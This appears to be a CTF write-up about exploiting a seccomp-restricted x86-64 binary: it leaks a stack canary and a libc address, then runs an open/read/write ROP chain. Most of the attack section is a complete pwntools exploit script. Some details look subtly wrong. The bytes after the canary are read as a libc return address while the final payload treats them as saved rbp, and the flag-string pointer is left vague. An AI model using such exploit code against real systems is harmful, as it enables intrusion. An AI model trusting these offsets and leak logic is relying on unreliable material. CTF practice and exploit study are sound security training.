ISFCR Finals: Advanced ret2libc & Seccomp Evasion

Bypassing full ASLR and seccomp filters using a 2-stage ret2libc ropchain with open/read/write primitives.

Reshma Al (Coldcoffee) · 25 Oct 2026 · 2 min read
Captured Flag isfcr{ret2libc_aslr_bypass_and_open_read_write_rop}

1. Binary Architecture & Protection Flags

Running checksec --file=chall:

  • Arch: x86-64
  • RELRO: Full RELRO
  • Stack Canary: Enabled
  • NX: Enabled (No-Execute)
  • PIE: Enabled
  • Seccomp: Enabled (execve strictly filtered)

Because execve and execveat are blocked by the kernel seccomp filter, standard system("/bin/sh") or one_gadget execution will abort with SIGSYS. The exploit must construct an open-read-write ROP chain to read the flag directly from disk.

2. Information Leaks & ASLR Defeat

The service presents an echo functionality that reads $0x100$ bytes into a $0x80$-byte buffer on the stack. By crafting a non-null terminated string of length $0x88$, we leak:

  1. The 64-bit stack canary.
  2. A libc return address pointing inside __libc_start_main+243. Computing offsets from libc database (libc6_2.35-0ubuntu3.4_amd64) unmasks the base address of libc and ld.so.

3. ROP Chain Crafting: Open-Read-Write

from pwn import *

context.arch = 'amd64'
p = remote('127.0.0.1', 9999)

# 1. Leak stack canary & libc
p.send(b'A' * 0x88)
p.recvuntil(b'A' * 0x88)
canary = u64(b'\x00' + p.recvn(7))
libc_leak = u64(p.recvn(8))
libc_base = libc_leak - 0x29d90

# 2. Build openat/read/write ROP chain
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx = libc_base + 0x904a
open_addr = libc_base + 0x114690
read_addr = libc_base + 0x114980
write_addr = libc_base + 0x114a20
flag_str = libc_base + 0x1d8678 # pointer to flag string or bss write

rop = flat([
    pop_rdi, flag_str,
    pop_rsi, 0,
    open_addr,
    pop_rdi, 3,          # fd returned by open
    pop_rsi, libc_base + 0x21a000, # bss buffer
    pop_rdx, 0x100,
    read_addr,
    pop_rdi, 1,          # stdout
    pop_rsi, libc_base + 0x21a000,
    pop_rdx, 0x100,
    write_addr
])

p.sendline(b'A' * 0x88 + p64(canary) + b'B' * 8 + rop)
print(p.recvall())
